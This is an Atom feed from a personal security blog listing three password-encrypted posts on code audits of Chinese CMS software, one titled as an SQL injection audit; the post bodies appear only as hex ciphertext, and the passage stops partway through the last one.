<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Shu1L&#39;s blog</title>
  
  <subtitle>一只菜鸟白帽子</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://shu1l.github.io/"/>
  <updated>2020-06-28T09:11:07.765Z</updated>
  <id>https://shu1l.github.io/</id>
  
  <author>
    <name>Shu1L</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>songcms代码审计</title>
    <link href="https://shu1l.github.io/2020/06/28/songcms-dai-ma-shen-ji/"/>
    <id>https://shu1l.github.io/2020/06/28/songcms-dai-ma-shen-ji/</id>
    <published>2020-06-28T08:52:42.000Z</published>
    <updated>2020-06-28T09:11:07.765Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">Hey, password is required here.</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="b05d2c36b0030d640a5d8bd82da8d968c19d0afa70e7d3c99fd7e65228ef7c2e">e005edcb58d936b244a322ddfeffa6ce7ae2a1c1f03e47d5b6b1c042d0c6bd0ab2cf7e734ae52d6aa441e250f3b5653ec92d95574e0deef8d8b6a3293c63e2e4d6b128e866380a6bef5567999ba3905ae20452aebd3b6859bf842029f117f6648cede300f3b689652f11114e2e15694c940a6dae56ed978f478cb881f3aa8a782fa6e88547b3bb2dec85c4480e2851961cf950ed840f4cb6b8704b374b027c74a6fd91e59002e6d2e583c64e3ed1b30bf1e132e1ea936037369eb56cb1a0e9dac80f7ddfb37f5d311a2b6206d047136836df069a880de6295951bee85079b061f77383b989dc64c017f727d113c4c1eda384ced79bfab3cb4ca2b6046a2aced07c22fb1a968e51a3242a67199e24948d16388df0557d1fdb9b0bcc4ec4acd2e7cf0bfeb76e634ab1552679b86a8c7fb4c6af4b483753691934bebbde987106dd8e9c64f81aee1cf89164f4e8e5180bfbd7bd5f390f17abe0e5d55f987fea706e57713ca91245b1b618fad7db25fd8b3e69695ff6129d06e4b9db638d3a37354024ab828bd5b0896c4acbebb4abeee973223e8d89930327d4ebef1337d2e1e49703059de1863d9b3172f4b71f1f89b9bd600e1535442c5308b05abdb4742f413fef9e4f1a370d2efe769d7e949ea7a55e436d52da3d89aacf1d04e6fc3f55cacc26c451fcf387453f69993ed73ad4f222e39022b52d4590e40a309339609d61ad53f70a92efdbec9f2995cd21bab98f6ab11f7815b1ef4b496025b7d51b090bc59652bb1e14cd0625acc8c0d14e2822c1d2ed450388b731f28f74297bc10bfb72570ffed24759103200274bc90738f2c7aabc8c4dc52557f71af0bd28cce7f6687d82fb225a46cf75568850131b8ffdd76e912c0ee1750e6d13619833c0ee473206f8366fa3f49eb4bbb6561ba2a28aac966d1feb482f621556def79fa80845fa7fe71b14c4b70e6e82aaf5de5fdf702616e52348cb4ad70196df12ff63fc919cb8a97be1405e853b92407b48b9e42318d78c25167617c1e151ee72652eacf12ce114a74f959b7674f05374756bc91a8f689aedf65b9e5607ac8106c838487cf8765866830b8c46d85aa6e56fe36e6fd9210e933a662d836ce69fc446fd49653982be67c163b749ea2ffb4227c8f497c00742a3a1b125f2986b817f6eb41905d6966011e56f5fae0e3768bb84cbc4dc983fb40e30113f6a825ead9d81209f1e24250997db812e8aaa92aa9a9babf37cedaa14a3b6f287ff6ebc97936c902e5c244d577edeada587b025796fcf311e07abf0c7528e367f4cdb22c9dbaf21f033bbcfe81129a575f39170b0e53faa3f1b1c12f017249a83e228234b5906bad62e623f7374164fe851796942154ce18c50cabaa7347d3200366377e20306481fbd7580e92a7e73ecb98a9f0883b6fff9bc7f000b9e2e4b168b9f430bfc95fd4d7b4d6f7527f73d3578fc5c1a36702dd2e4f0b68abf15f3c7865037f7e7bb645992ce0255a1161a4dc61c37b00540757923a49f5310b4c36852e429ad7bd3c9c8f15be2ba952cb25dcdc077ae042a136966299d47bcb9c8f2943504c142b9255df75cb13353d6b40127e021060447699437b384304d2b5414da26e4733c722300edfc0d9a339506f0830d9c3681b9c5215e3ba34b0a7fb454610ba335efa5aa34fb0392e7c520495ef86c4fdaa3c223315711dc132036fb8ad664b2624628e1f6a769258c07ce4dfbd5f5b43c7038be7b4891bde5439a2ecd0a3bdd1951f50038d62089baaead3c7d16ec1cdc2bf6e648f64d88e39ae418ed8f17d82c0301977800554adb1996bfcaec3054b5324d01ff84410c6399b06d00f1213e2cda1b3d0464fc376e95f83ae3148b03e5d56ac50707181470a3cb688c76725d2dc2496a909c4b80bd3cb0d9ea64f473f53ccca4affb4f58cd64343a450a7834c3076c57d8469ab3cf6615ecb0c70fd026b9bc3f691b0f38a8eed2bd25cc52a7653a2cf73c731207cdaf56d48947e593663a9dccc14788ffaa81a73d655b602fa9e142394a4cebbc5cb120f5d556e1ca95660156a4807d875154fd0f599a65e7d8998c29328a5991372aaff14e5eac2f35afce47751d71f6f7df917fd67408189f4dc3b2c3ce30cb564bc9a94ec536ea2f4dc65e78bb4e32f7b4931f73f840a84656c076900aee565eff30a42adeffaac8ac32edf22c2a26e7bbc3cd0ebf57a3c2fe4471a01ed3989bebd823036549ffa4a593d57c0da6e01a8bb20384812a0503a41e187fe45bc8a91414b712b655cf2fc57fcbaceff5d05038057d6cde53a53d8aca03427ca1cb723cfbec63ad48ed73cad0cff756d36bccc5458cff5b91cb205e6b05356c23f17f32b906c289e0489de3227d195609110906f30f72d9727b769d4da277dc966b2d9b68434b796cdac4b15df433342ea2870524125bd370dcd6818a4aa57cadbf9212157b7b1b46bc985deac900b3a42f57f9d90c163ded7128b0d71e38c25410190ad9c68ddf3b4ca6fad8ab65800e8a5a83786caeb27cd01bb6d72f8ced56bb38330d0201b2d4363562d1f4838177a1ef13ff0274cf92a4ce9aeb163513f5bbc503a839581ef434547e759f05fe7692bfdb9622763df43154b3d6acc6e63de6c7a2788efa403a45287633c1d26f76f96759ca3a5d124e17d8e46e8e08696ed21e7cd5564ba5b5445c9f5e2f8d0f88ac9d3a2ce91cf49802c88bb42b78546e7ab6403d7990d2c8329bb210a811a94190b0f5c81f235659cd4ac5555c54d4be3a323d0003113a8d08b07e5a160e8699ce7d8c7f19c257daa49a6f7705ea3a0969c4430c163f9f24ac21494e8a594b951f7c3461cd923ac866985a99f02ab424c310e4332c7de4e6667d888582581b8ed37c286d32eeed4d183fb6e7fbe69103aa1228187a2542739c0db5ee7112307da4c15ad3087bf8c075036f46acf2c7c37fba85651423eb2928a13de7a57211b254a024917a5d917c66b8463670c4a4bad1ceccc301a575fddfca1e3bdbcd33bdb5b7442252e623a64243591a30769cd10cbc3a030d7255ecef137d2f329a0049a957cfb4c8858c7a35d32e9b4c5ba0100a60b20857569dd487d07de447440ee5942b4320b49cf51b3fc6488a82fc603650baabc19f98aac88fbf23cb438746a92482baeb44eac229e56d2348c655d699cef148455a84c68ffa2fd675eaec575bacde8b32f7a85cf97b0a87c19178a42a54f0f4711b313f569d8982b9991a5f0f11d074464e8212e016a6135090632382e9532b56c1fe7d94e6c524d91a8818b63c20846aa34437d69f88510c74a490ad76caf06a59ecb4548b68303d1b2f653f7c33d538231998311321099f98620e934801739a730058a3e2b9abe28c532817d1024032131003713a1f46f75749d2a9a7c513491b25329cca3cb0ab56ddcbe8483ab5bcdcbb0bf27fdef0fde977b9b6333832c64ad816615868fcd8bfafa7fe25fedd1a266ebb98a0098bb3f0003c7fbbffd1667b6c7a755c3afd5082f76a19cd1136a0275077a88619ad5202a49cad2930258f29391895f8cdd8e861ef3b963941746151a0ed850264404eb29bbdc523b7da89655a92becd82098ef4e8f8b1eea93e8f35eaeac46d4c81d99f2cb6b8f8c295228bf38103e7c80c9aae646307af3fddfaa4de4fcf60aa5dad4da8fc11365963513ccd451bd7ffa934ccce2938bafc69047348a0bfcbb72a7f144aece596c72ecceb3647bc2e701d134d067365fc32d40adae341c42407fe75f4df9556bed516e3b1e7eaf27675104044e2ebfba1e2af80b371d12759c3c9ec3a133f45f75a038ce7c362dc1d93c62e2156ae8d63a812ca5a41f61578058a10a2781c6942d58e77b4d04831804c0771a1606bb99c377301f75ad2e6c42a3396a9622e56e246e8df865c226c16fb09bbe3bc39313f95ec7709db8c0bfaa84be343673715fa9808a7b09be9bc6558f29ad4519718c17cd8f63c4b73a44dee7f63f625bcd70bde67f202d483e52793efff5ca9e9265beefec061b79255eab3a9ad12bb1d6263fc63baefedf3fc79a510001b32611aeda59d71d7c7c5a5d23c48bae63d7e926b25d9af0ab779e6b9733b4df52148ce562f4993bfaf718d267f0ddc31a9f76692a8edd9b3a765a94e69e2dccfee78c29907bf20bb10d02707190b21f40030fa942614dabfe89f38174a6d5f54d3fcb798eaefa25617641b72cb2e7e65c2e359d580a8dfd0b0da5d420f3ab17e01e63a7509cfd7aedef3c02bb75e060c392d54b7beea33d9433acbc82107a55964de25d70fd75ab181d6568e51f3079bd2ebd63627099dbe553b7f5a51a7711941fb773090acdd22ecb8c9b21cc06c3eec7cc5aa8f0d4a82e97d60a7312f89ae5f2e5353a32a80ba36438184ca7924b2e92b33ca39db39f4106f24a7b3b281ffc5b38b339b6297db1db5813199818b369f0f1ed2f5687776f1371fb8494c8c3f7da07d96191513f44c5e707867b7a2ec49e54758ee3948277e81bd200ed76d1fa11b8aca698ac878b629ad31af8a137024e88e3dd1f658a3d481b733fc0b96f399cb11dc8f9bdfe90c4482bfe73b933582cf1738a022799959e3aacb8078ec24dba112bdec347b209345d891657ce8b54455ae6cb7d30afa132364e2107d589a335a6d4f8819fe8dd8392e9191d3d5ba37f0f3b59721d72606b884d6e51d018b86a5031ecaa8f775f62878e968f972855a179f2368f25385870848a43a5958b3176daceef6bdbf8232e09c6e46913e31178b19d388551d3ed848b1eca910661a1b9dbe4b902325be7cfddae5204538e01ddbe1b46b1124d8c39aac7d1f607a9e3451a5176c663231e3a71cf00742049f2cefc5f38fd235c71b625ba8c070f77c08a8ac879a591b4e77743c0a8df63a06654cc0e11b181ba9f236c8fe3b9699e8f99b9d2983793e38fba1b8619717819c64f19d44bd3d6e65d57eb37dfd981e1842b94db42c3e96b5b3d233e222b7c1c68c772680928380a4f8266bad1d935a4ed0c01f2c0d35e69ff18d41aaa69c885da3f501388e32658dcee9f83abdd0084c7608f953bdc9ab9af74bbf3e8fd9171eac35455fe33b9704fab8f8da97403348e48bc99157b22cf38e2ee8d2f06fd5629ae2be471317a21601c74c81e593661a93d4ae6885a2707767da95bf6a7625d3d7d8cc7b4f2e7092f9da66e0a53a943917398d6dd2d91c59c527157b23100c0284b9d744e68d9bbe591340679a12203233e0799d165efc96d63bf014b3daa3abc31bb4ec87460d24bcd53777581bb86b5a852cfc125c3aa7c371057a2b6e7dcd467698d69330620c9a056e1e13446b5e8f59bcf35ee4ca672973230c197481fdd9d8f680f6a07e0a9f6ba110a1cd0741c932476f26d84eeab31f87003d6f641f459e2e1e31a72779c48cdaae7ce0d03b2eac8e765802ec7663962187c4a7f39cb28c463664c3a49ccafcd8269c812a02e5edeb55a61b39e08333ee5bfec1b5ccc358fcd366ff49e024194bba6cafc6ca6c0866c16ac1470eb6fa986bae4b40da4bb348cfa188c3f0e579c439f4248874a5b40e52023a1d59fdd45d11a3f6b1bea3d84dbcf82dfb075de3af9aa2894235b00ad8f384d64ad3a54c07d2d2ed6facb4c5672779b0790b587dfd1ce98b1220f8037ee2fde766dee7b5280d13fe3028a686dd2d5df028e1eebee96083621220d080253e035137a5b88726fd20a6a3114c138722ce737aee0982c3e71328435b108581424c11a3cd42aa5559b4352da5c412ea5533fb3d07bc2aea5d58f5beb86a9e7c2b66c0a23b3fbdd22a336dfe669278c0533563ca9a3cb878229671f100047dfa0d5d5a67718938b3f64740c3351ec7550b82dc36fa8716a3c6ac160f101f1d996a20e9904e5bbfa8360e15af01e3c7318f2a40c9029f7cab9fcf6070190d289328b3b23dc319fd8873507422a4ad67b40080afca8f3d83a3bffcbb85161b0e4d98a66ffa6cd25630ef4d2d0b5c5577d0b41719c892b1bbb9469d0dd7f4192f14dd99f46d2164706a4d5f2b0d6ac1b0d5a222e740e125ba438ecdd892d19e5c0c0beec880d043c351d5eeaffb2fcf6ab6d117d7ef2c18040de7723821c1baaaccea80034cec17c9786c34f8bd1886157d9bc4034028830d38c9704d5304e56e369aae5731132e15a6bd6d29095e5ada698c8b1aa70abf3de140643bae09ed01000427012139541fe69191364a2e0bf8f02cd8180d4109f5bcf88871ced3ba2c54362ef1d654c8ae79cab8b26287a399771286e7775273bbdaf49198b3ee0d412a4ab8659961bd1e2d3de684383de0857746c86385adab228b7c61ff778fc0cfbeaf801ef837eb968fbf9637387ffc02ec71a163c824bebf35b8fc5c39e81f4dafe8cd76156227cbeecb0335bfbe72e666123576a089c2a1267f0422068323f6c0d85088f21c3c6d3970441e92f737d2326373dcb19f5e04aba82f0ad8e8c1a359b38bffcc910082ea65b54b930bff83eb51f238b5ccb8f1c3557743a268604fa2037e5ffa3ad62ca0c7a0d6c8f38b970204e6175642b1ab94478bbd6de07373d7fd67ea7ee025e8a3e18681887489ff9fc94042f8c2468fe5f5289925f6c2a9a0b781b7a2825fc80d2ae41303e6c394a94f06c41c0a0ef0c972ccf8b18ce39b43538e331bc01504fcb7a6215f6d74281f77272e43b4137bf8dd40788e025c4127da4e2fd3e53ca3387292834193b14ffe69b01caaf3dad5cc2e3850d3e67ed265940a9412b9b662eff9bedcf40e4fb0c0a34673513cacd0c525373eae42001bacf5cdb6ab9955d87738a2d743afa43633edef488094375049aaecbe80a734bb19e54464fb0ba6907213351f5ab97db7f94953798e84a580e98c55d35ff1301d0a322391ab77fff4a64da06da9091b9ff540b7281bb68e671a849e8ccd66bd2326b32aee8d956bbe372f75ee9d4b95136cbaa9f3515b90642f65d39f8936694cc5b9538d821dcb51dcd9f099fc6c1327ae25a04f7ea6661fabcb8e118294c64af0d5f177b64b3090275a83471f0149174489e67f27cfd38606e6f62517737a4ec6647a4e4aad1981a2e6cea5d45a8f8ffe1049b40f0442c3599cdc11f0974c778095ad71c62cabe32a996844591da35dd178b31a23387fea3058c0b49f34e7a56871ebf5fc2e57becd62ac64d0ae496f9b148734df3c47eabfeb00b55d426299f43ef5c2c7449e022f911f14a39e28e6825d92ea546b5c4bf72c8865abb46d325b7a37d9ee5ed325244fb84d7ef0cc8200690ef7b360ca5bfe9fcd16c5d3ff8d41ee09d93a66f30be13b67ad0e6c57aee2450375f8aafea83ca51f6804a0c04c203dc5b2b9fad00d927e052c79316ba24df2dd8a0c714674324573173da2719dd51853aeaf4599a98d48ed0530426653c3e4429251c8640d22bb662a5f5583b84b95ba8c676c4d0a49f2873213d4632aa590c5aa10d4957df5a017cda6dfc44b7a85f6c190e672f0e98827ea4d94b4015ff15ed81acd8a699d5edb6623ffb9ef35dc70c2e5eb3b73542d3610cbda5f79e4d9f0bb6adcd9c94f99ad552e47dd72e298a02581b8547bd1e7743e59ae41b0fea37e7543de3c3bab38ee4bbb34d2fe51696c2e3b82e87372e664cdd3707a833b194da1eb30ac9c819c1b7c5a09bcfc3184eba717c149dd3338649fa3b400d3decf467fd00a97e11c2cfffdcfc93951d5a5bf94c27ee267cd6df381a601f0869498fdfe0cfb2b4eb83e968aefe5a95ce5879d65e518c9b0757deef491e7729be946f8bb9a105c321b3d7b814c61302da5d19d1c6ad6d21f637c83c91803706bb85b7d4957f9a4209445c5ac504100ab2da4f621394919d8cab4deeff14037b42e4f74112789ec4dab37ebafbb5c962e0336e3fbd459b8a55fbe1d69a9ce6a88542ff8e29a0ecddbe585d86b44ca9e083ca7e5a03cb0eb9f857a28ff43e6addd73eba1ae9bc317952e529163bab9cd544991eb9c7c16e18a4f00fb11dc065e424945f760b17554c4d09e89a0605ad3bf1d8f44f2410f7cb3398f71078fd67d268c75605626122db7bc9556152e2bd02758797a1d1e607bcaac2c2886b3dc987390ffe5a7fc09ac6ee129799403c163cbe60eace7dfd844eb39eed69c01849839a78db4e1ac753d72045a14236cb5faeca710b5ca47c284eeaa31a82445b92f5591faff5ac35ba0deb30ff1015901d1575f577a951ce7ccf702ac6f90967d7d4e34ebf4ff10fb6a3f84b38a246ad19a90b0e762c951e96d197c2b43d4905fb5be9930f7212ad04d9a89b331415cb8d9fbf22dc1cf18ba12e83ecf39037bf34f766e2d0cca55e14ee676a5e90f722cea8cbf11a2f82eed1f5eb2bb865bdf4b6ed993be048564be6a9bf5df544036d1256fe30e89d56ae52046434d65933166e4bcb0981332362a2874559685745ee73c4a4d844b36e21fb2391a1fee4f9cb163a3625a17f6c8b440fbdfcc871368e947d7c680683490d3af0d4f5a1c69875f1b62331dafb418c458641c5782d8b279045025764fa06e92182bed75a2b3aa402d08a86a585f2a87c9218ac185b6ba5eeb73fcec4f1d74674f9e55f0920eb496aa7040e6df889b070affcf4957e8593ee3b0a29811211666845f800efc2b9e9afe0443ccfd6093b204abd6fe0634da9bcd3a7c6cb1ac17131bdbe9580c8e7993e66de5a0d339f3c5d285faa9cbc5b94e0514e8817a99f87c538fff484a3501ddb44a33d67e0bb566366121a4d6e2ddd1768f011307dfd26ab26d8355d8409d9f89c9ca9ca2a7c7c3619011516fb4f0b26f29fd6cd5d6e0d5d2f40580a6eb9ad6b906cb7eabfc2e7e01ef15b7155e87e2319552e9edb47ccd6be87877de39412942fb2f403337248a95af02ac42c95b52617560dc808dc58f39e04747a742c9eaf83a023ddff9103eb3b6de889609af82983cf0190da89a58a02a89c0c26d788baa92a0b44944bb804e21afbaec767a6582371923fa84775d34a58041b0c0a2a39432b869d76c7f89e708e4bf48cb47f6e059cd1db3b5bf205ffecf4655e325b5bd3c7d626e42e5fa480f0bda677929755be560c423f6915b886c7541492101781910129a40be9e2428374581cd9193cab36e167a46bc4c2e0039ecea68efb762fa38f136dd0f5868f92f909bcb3fee45acd40094760acdbdcf76505b512793042808ca381909ebe7740048ff4f492bbe5259063ff9eca474fa44bb310355c7e6b9bf0f8dcb260ddfef68a1cf82408a90bbfd93927ab9495ac3abdac1fb872d4df1c0294ffe070f46c9884f4d6d87ba80c50b18fbc0b24597e47eeab2797f85872f8394ad7cd0b6cd2a92ea6c3d4bd00ebf3fd68c30d3c27593a3bb4affc02ca21602651d4671de20aaca8d9e54bbacb77243723be3c037fa8e025dea284c6c6adde554bd2e275a1c33edae4b0fd9ed9205ad73fc6367b904e8039d1231aad8f87c0fca9b8bbe09ab9fd8b10a22ce0a41c3decd65d08687d34b3f22b6240de77c57430b92803b5dc05914488639850fbe8c2e3dce431276d0e436e3fceeeacb804ca8ef718556b2a351de43fcb22183412274fe5a1fb9c7bc267dda6cdf8f529308afb707a836c478003ccfc3411f69fb085e4437d7a8ef96054c57394912070bf45b9d6114947f47c9f3ba04cf2de207079ce7be5193d99dbdd53f9f2d063730d649791420497bce4b762fa355d6332fedd3009a02248b8b39f87e2433fbe19571d2b37dba69c87b56ac42301b00bb47c81c82cb9446a627349726155cca91bf02283113986724288d34f56bb398501532c38c53dca9581ea1f32cc7cd53d947e9378889b38d5280220fc847e8f791f173ce1e7d66e2c5306d38eafb833530306f2850a25bd0e9140eb85df7a0eb22ea016abb3a2f61fa4aa39d0eb4379368ed257fe5015bc20df8315999927ae13c46c02d2a8df4f780480d684bab5882e59dc3826bcbce11242e50988c6e68e0ff7390b5638394fa9845b85f6ffc4928767ec39fbea07b5c4fe802e3787afaa46cc9029c6185f814618a9cea550d1933a4ba218c11aafc8ad0757a1fe78ec14c28e77a9a2c3a0411421b15e3b837e697d6db35d5443edb5bdf8dad548bd796d510efe4c17e14b72831f93d217bbb61c16a83beb9065e43e25bc90992292c57fa41c6b9db6918d39e057f285ef3a45edd9d41c3610094b8ff3f73479dd4dd3beb1ddacb94bf0041ac86d3527b308f12da166ed6298b78c67feb59582e2d78aa55b7e1f869eee6b5511aff38ce5e3387955a45b33064cc5d88f1d3f48dbef07adf9cad8bf630fdafee2371798b532d74aed652b644ac</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      Here&#39;s something encrypted, password is required to continue reading.
    
    </summary>
    
    
      <category term="代码审计" scheme="https://shu1l.github.io/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="代码审计" scheme="https://shu1l.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>Jizhicms代码审计</title>
    <link href="https://shu1l.github.io/2020/06/28/mou-cms-dai-ma-shen-ji/"/>
    <id>https://shu1l.github.io/2020/06/28/mou-cms-dai-ma-shen-ji/</id>
    <published>2020-06-28T08:52:22.000Z</published>
    <updated>2020-06-28T09:27:21.815Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">Hey, password is required here.</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="91270d06592d4284604580f4a44befa04332c411925c8bb938910048897a7453">fe040a29e7dd22b4e0f1dcc4236675aa</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      Here&#39;s something encrypted, password is required to continue reading.
    
    </summary>
    
    
      <category term="代码审计" scheme="https://shu1l.github.io/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="代码审计" scheme="https://shu1l.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>188jianzhan SQL注入漏洞代码审计</title>
    <link href="https://shu1l.github.io/2020/06/28/188jianzhansql-zhu-ru-lou-dong-dai-ma-shen-ji/"/>
    <id>https://shu1l.github.io/2020/06/28/188jianzhansql-zhu-ru-lou-dong-dai-ma-shen-ji/</id>
    <published>2020-06-28T08:51:43.000Z</published>
    <updated>2020-06-28T09:19:40.808Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">Hey, password is required here.</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="5e9a99c637a5dd944a8dab441966c23806a2e8b08e466a190627f6804b2e0cf0">7f72502a417ec5d3e785d86e3c7240c8543f7b25d0690aae79fb85f4d15385ed5fe309ca0c297fa3a8bd8b1c1223a70cb8d7c64368057cf60f41349d86aacf6736aa015fe04cd35b0be3b81d6879aa6af3932a4a4a0af2ead4ff451de8c40a66a6a3c0e20481256d236700b6b4e5e0b75a4e0153cc0d7f0ab4b2142af76bb3484cb2aa0ef593628e4cb2539e33b02f2b7e28ec238225057d409994c89f81c70c809fe6e6fda49f90793ed92e355747994b96ef7aa2bd43e39a9aff0946117a97f70831c6adb74ccd555ddad2582ee8ee3b4793bee45fd3881ee36d20de2056105b681baf7be433e014d5529d6bce2f188fe4d8db1dbcc3a1247f8fa12898bdc36dc288713350f9c219226dd9b8ab89dede423e0b7f8382539b562d3a5f042b2b41efe9c01ca835e3be2edaf8de8981ccaf044e755da144c95e6d7fe9f79a1886f789195846e0669b886101ba0d093dcfb99efa49fa78b62d02e5d9ea40425674c97f08dec2d7d025d151f56d41f33016305016203fc5501baeae86291a1c640d3f4a603b253b47a75f71bad9ef16ebcfa244674714f5fb5fa7a2952b0788bb4814153859a32508e4e72592c157df8161687ba2b37320c68639491aab6a94731fe22dc8cd1207304f55fb9d0a33391ece934551b08665795b91c3ee80cb6a22eec57d576873edd07336bd6c0a2206091940cac64dfa7799d40c1422fadc2c4c11fb2fcb317d07f11da2c53a670b4ca59ef367e4253435e2b6be841f52b8bc082518dda10dd5bae54e416d4bb3c867bf8afef34e4ec5a1571a7b476f8880a8d46a7f0028c9c481c0609f050018423b1f43d82b381246466de91a251b0cd9ba0ba3844573c789a37ec5701aabcec0fc8018c9507fccbf6a0c5d7ea4104410c74ca1d782ccb1c7f8280a6289160f97e954bea95e0f47e85d752b41df906df42edee3c4a9628a154b5f6c134e14352e4292a7495a187bcde3538c940b3db661ee08b2832edd7df25e4b21cefaffce3bd4c903e7c70dfcc107257a99cf1ed1427cb24dabc96be3013c47fd1118a593cdda5abbd0352faa47fd9cbf349d42b0b2423cead0fbdd8d0e4893376b3a81ba31c0e577b8d8cd5020df9aced6812ee2943f6100afee160a676bfb8cfc7c093f05442ad3d4f0200582f37d8c0d9954ae8c64074e01ebdd5e030e02836c3b2aedee69502cc3566c480caf1bb50cd137d891ece487a670bc3e4634ff41999ded90cf76787dbe5c2bd2dc002107d003a1dd579f385ef35befe98a8c0508758c48c33f51ed4474813dfc5da10e43a9140ad3e2e53748c3c4a5541d08f47d531743a8a2ebe56458000a1709e56d140e5ca1006dc1fc4a82b5329a3d2a1875f5b1e36041ed764e4133724b89713c26b9645f34a411bf1dd132f80d870bf117ffdacf94493c419bdd00120aed497c87112197c6138e2fadc5bc4d71fe05e854ecb91e18ecfc9d932c80f0517c13f95a1a73cda03157f30ae1d85ce8c0a38631f027cd71aaee1852b8c64e4425fbe7b36233ff78adbe91c44046bef2350175a34c2fd8b96cf6223d62c7df43e653a40650393905b4e7fa0fab5f2f2b064985d8c48c9e502a1346836ddce4df143039e3bf7d639b2596ca46349b8bd7d66ffc4ea9c627e57dea84ac5acd9d4cfe1aaef9ed44052b72207e5bde3f6a3e21b69e0d5711deaa1f5f0084923d337e6a3942948373ef3ee663a85d95930b7804a794caa91a8c4b5c739bd2753ca3aeefc63e03a11918553acddd527153824210b5fbfcf8c6735bb0005ec33a4979dfce3c2c70c5fff4261754310d531825ff5f66e5cae20698b942fbcbc0afd9ea03359ce5efa8d5d8fd10ae087097ddecba39637bea91c52b0c51c926d91937625b56d6732fc79de8f26029ec929935925801418244eb0e5d8ea03c2ebbaacd59fc8523fca21a7127c5a585fcf27b3b2acf5fdf6ca7d16cdfe8821796f00b447a110ccb381bbab6738d3e2209201138901b06f906bb14f08e596892569ba34da35264aceb3f8af602d39d4148ca3f1be99cc9eab095794ffdbe6cc311ac1b35741e7fbb559133f55d37c60640b805cca764448ba7e1998b44d02fbf55860db7ac3cc22842a956a65735bb610ce5336c4fb0ebc10863fe2df19e5b255574f7018aaabf510655339d8d28ab41c2d44f83f44516a53a3ded03c3f6ae37baab9073fbed998f641c260b4438616040b0c486262775ef163d499cd6d958c24c753a77b9cc9c84cdcc1764b1ce2a4c63eb4b6478816e92b04d067554a50f5687a170d921de58149d141787b99e13a32aabb2ae30dd8298517f17fde540f10b5705c2ef8234a5c67019c4b2aa74c148b8a4f4bae84e865bf5b9d37fc4e9cb054d02becc074b51928afb69086364a9e545ce51766c08357a1c5863e984b0bdb351affec69f30867e69f0067b81df295aaf73bced5aa02abc45ccef90720d9a03014641b5ef6695afcce1f2e3fb09395efab198845e132d04ef9a1254f41b7fab963fe57613c4af73c067c60d4b3e763819998855352e00d76e413e4462f6fb8a36654d50342a428007f4985bbc796095e6dbdd4673bdadffb572fe42314ba42d35b6b0e29e89494458f5e36c3e20760da233ee6a041ed3636fede7d18947d8ec23c5a2a04f57b4a6e35e68612350011423b822200ea301d124676f9f68d80a4cf5af437eefa89516fca0931519c8a5b2cff6968f2589ff7a3856797693a9cd6b8d8c74118ec315e1a2ea110145b2c46c54ced2c3569ca05473516db7d628cf6263dcea5570af3deee40d22bdad8915eee98fe644cea3c3e405a4c2a0bde5db526c8471dbcd54f84a946b58e9f9c0f573abdb081a6cfe14d02dedb099f4f6f6943df73a557d59928c41c7caa018ca353ced80433d9b38f7023dbf6f522f3559da1e6f45695a60e5241af55ebec73ed816e187a4807269e9074293e6d4201624e1daa6243a84325383475ee7f36dc0db328871db8fc9b26b526129f35fb50598bbf6c9b044969838587d959756ae7c0e009353382880282d6b1b7c7d0f5884ee725980b23dc866815d6f810ac80b8395986cbcabbb18ae3b1bbde26c892c7ef15c6077236f56ee4fb7b15e31de2445324d5310f47b21f4805e9776e09817934eb0bc51569407eaf9b3d9b4fc98980c6566a5436f866225c18f5ba6009e2fe2d7bdbec923800b729f325e9f313faf7933814afec1525cf580e1a1879a76dc2f8dbe3da99427837903361a7427ad3382004e9d40c19b6667445463109f68dce8408dd02c40df5b5bb8642375f514a2e94aee0330a577c219befe4db32866cb9fa3373a26bc3a165233ee044eb9e0b96f343d0594c29bf71f292f0d46b3d198bc01a60f533477381f1fbd36f73a4f092d28f341c1c1a698e3cfb2426cbac53a4fea5e5098100a5b3b030a2e14abb522a81d425f7acc4dbdf706df23d696990f0c1b100527458222ab6ed4052f72f73db42143c818f47001c4b960be281bb19c712b4370b1b9662811490031df512ed2fa7323b1f98dded05b4d784f4fc7a64ece17a416d07d47e91f39c1905b5f834702bc2e12c16840e5cda43b2ca181add8abfb00c0ceddb526474a7af0e9a15865deda23d6f41e64e5e84de15d84988fc150e2c6d0f372c33339f3758bf61fb03b8ab79134edce437d43025029edcf52fd6590ceff7478821b1813fd04f8c96aea8870a28c98fa03a4c68300024c84af6d0041e966ea9320e8c2e695c290c3efbd59d093700cfe0bd8bb2c8ab179fb2fbbc59984ae269ff09646548c07457c7d7d2599d6aa1077cde1d4b4c1193f3adc51780ee803ee924b90965cf8ee86d3d7def32aafb49094410f001a0efbe632e811f18195515d76da7e2fb13ade723ee83c9f6e253578b19df222e6db35384899950946501d07fe9ca